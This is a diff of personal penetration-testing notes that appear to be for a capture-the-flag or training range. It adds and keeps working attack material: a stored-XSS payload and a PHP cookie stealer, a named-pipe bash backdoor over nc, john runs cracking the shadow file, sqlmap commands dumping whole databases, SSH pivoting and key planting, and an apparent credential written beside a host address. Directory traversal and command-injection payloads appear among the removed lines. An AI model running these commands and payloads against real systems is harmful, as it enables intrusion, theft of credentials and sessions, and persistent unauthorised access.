@@ -14,7 +14,7 @@ Private: 192.168.65.20
 Float: 10.50.23.229
 
 Internet-Grey-Host:
-10.50.28.45
+10.50.28.45	e9YErLDvFlUWxX0
 
 ssh escape sequence (shift ~ release c)
 
@@ -57,9 +57,13 @@ Server
 Set-Cookie
 
 /////////WGET/////////
-wget -r -l2 -P /tmp ftp://ftpserver/
+wget -r -l2 -P /tmp ftp://<IP>/
 wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website
 wget --load-cookies cookies.txt -p http://....com/interesting/article.php
+
+wget --mirror <ip>	#recursively copies all webpages it finds, not stopped by robots.txt
+	egrep -r '\b[[:alnum:]]{20}\b'	#cd into the dir wget creates, this looks for hashed flags
+	egrep -ir '\bf..g\b' 		#cd into the dir wget creates, this looks for mutated "flag"
 
 /////////proxychains with firefox/////////
 preferences-->connection settings-->sockshost localhost 9050
@@ -69,9 +73,6 @@ addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5-->
 /////////CURL/////////
 curl -o stuff.html http://website/stuff.html
 curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
-
-/////////decode base65 in CLI/////////
-echo asdfDEF== | base64 -d
 
 /////////Stored XSS/////////
 <img src="http://10.50.XX.XX" onerror="window.open(&quot;http://10.50.CC.CC:8000/ram.png&quot;,&quot;xss&quot;,'height=500,width=500');">
@@ -89,34 +90,6 @@ $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
 fwrite($steal,$cookie . "\n");
 fclose($steal);
 ?>
-
-/////// Web Vulnerable to XSS? \\\\\\\\\\ 
-<script>alert('XSS')</script>
-
-
-//////// Directory Traversal \\\\\\\\\
-
-view_image.php?file=../../etc/passwd
-(from url) ..%2f..%2f..%2f	(../../../)
-
-hey ; whoami
-try || -or- &&
-
-///// Command Injection \\\\\
-
-system("ping -c 1 ".$_GET["ip"]);
-; cat /etc/passwd
-
-/// Generating Keys login as that user without username and password \\\
-
-ssh-keygen
-cd .ssh
-cat id_rsa.pub	
-#copy paste output of above to webserver
-localhost ; mkdir /var/www/.ssh
-localhost ; ls -lisa /var/www/.ssh	#verify creation
-localhost ; echo 'paste-key-here' > /var/www/.ssh/authorized_keys
-ssh www-data@x.x.x.x 
 
 ///////// ReverseEngineering Notes \\\\\\\\\\\
 
@@ -215,16 +188,34 @@ firefox(from ops)--> addons--> foxyproxy--> (icon in right corner) settings--> a
 #scan 192.168.150.224/27
 for i in {224..254} ; do nc -nvzw1 192.168.150.$i 20-1024 2>&1 & done | grep -E 'OK$|succ|open$'
 
-#wget -r targets
-wget -r 192.168.150.230
-
 #Enumerate SMB
 proxychains nmap --script=smb-os-discovery 192.168.150.245
 
+==================================================================================================
+#python simple http server
+python -m SimpleHTTPServer
 
+#john
+john --wordlist=passwordlist --rules --shells=sh,csh,tcsh,bash shadow #only crack accounts with shells
+john --wordlist=passwordlist --rules --users=0 shadow #only crack root accounts
 
+#if the question mentions a beacon
+tcpdump -i any -c 50 -q -t -X src not 192.168.28.100 and dst not 192.168.28.100 and port not 53
 
+#backdoor
+mknod /tmp/f p
+cat /tmp/f | /bin/bash -i 2>&1 | nc -lp 127.0.0.1 8888 > /tmp/f
+export PATH=/tmp:$PATH
 
+#SQLI
+proxychains sqlmap -u http://10.50.21.166/login.html --forms --threads=10 --level=5 --risk=2 --dbms=mysql --batch --dbs --schema --tables --columns -b --users --passwords --exclude-sysdbs --dump-all -v 0
+proxychains sqlmap -u http://10.100.28.48/cases/productsCategory.php?category=1 --threads=10 --level=5 --risk=2 --dump-all --exclude-sysdbs --skip-static --hostname -v 0
+
+#SSH
+ssh -D 127.0.0.1:9050 user@ip -CNTX #dynamic pivot for proxychains
+ssh-keygen -t rsa #creates ~/.ssh id_rsa id_rsa.pub
+ssh-copy-id -i ~/.ssh/id_rsa.pub user@host 				#adds id_rsa.pub to remote user ~/.ssh/authorized_keys
+ssh -J user@pivot:port user@internalhost:port 				#tunnel straight to internal hosts thru pivot
 
 
 
